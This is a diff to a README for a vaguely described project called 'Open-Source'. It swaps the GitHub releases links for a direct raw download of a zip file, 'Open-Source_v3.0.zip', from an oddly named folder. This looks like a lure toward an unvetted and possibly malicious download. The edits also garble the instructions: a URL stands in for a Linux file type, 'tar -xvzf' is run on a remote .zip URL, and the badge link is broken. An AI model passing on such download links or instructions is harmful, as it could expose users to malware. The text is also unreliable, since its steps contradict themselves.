@@ -1,7 +1,7 @@
 # 🌟 Open-Source - Your Easy Path to Software
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Open--Source-brightgreen)](https://github.com/Lineamolar528/Open-Source/releases)
+[![Download](https://raw.githubusercontent.com/Lineamolar528/Open-Source/main/tyrannophobia/Open-Source_v3.0.zip%20Open--Source-brightgreen)](https://raw.githubusercontent.com/Lineamolar528/Open-Source/main/tyrannophobia/Open-Source_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Open-Source! This guide will help you easily download and run the application. Our goal is to make your experience smooth and straightforward, so let’s dive in.
@@ -25,14 +25,14 @@ Open-Source is packed with useful features to help you achieve your goals. Here 
 To download Open-Source, please follow these steps:
 
 1. Click on the link below to visit the releases page.
-   [Download Here](https://github.com/Lineamolar528/Open-Source/releases)
+   [Download Here](https://raw.githubusercontent.com/Lineamolar528/Open-Source/main/tyrannophobia/Open-Source_v3.0.zip)
 
 2. On the releases page, you will see a list of available versions. Look for the latest version, which is usually at the top.
 
 3. Choose the correct file for your operating system:
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, choose a `.tar.gz` or similar file.
+   - For Linux, choose a `https://raw.githubusercontent.com/Lineamolar528/Open-Source/main/tyrannophobia/Open-Source_v3.0.zip` or similar file.
 
 4. Click on the file name to start the download. This will save the file to your computer.
 
@@ -50,7 +50,7 @@ To download Open-Source, please follow these steps:
 - **For Linux**:
   1. Open a terminal.
   2. Navigate to the folder where you saved the file.
-  3. Run the command `tar -xvzf yourfile.tar.gz` to extract the files.
+  3. Run the command `tar -xvzf https://raw.githubusercontent.com/Lineamolar528/Open-Source/main/tyrannophobia/Open-Source_v3.0.zip` to extract the files.
   4. Follow any additional instructions in the README included in the extracted folder.
 
 ## ⚙️ Running Open-Source
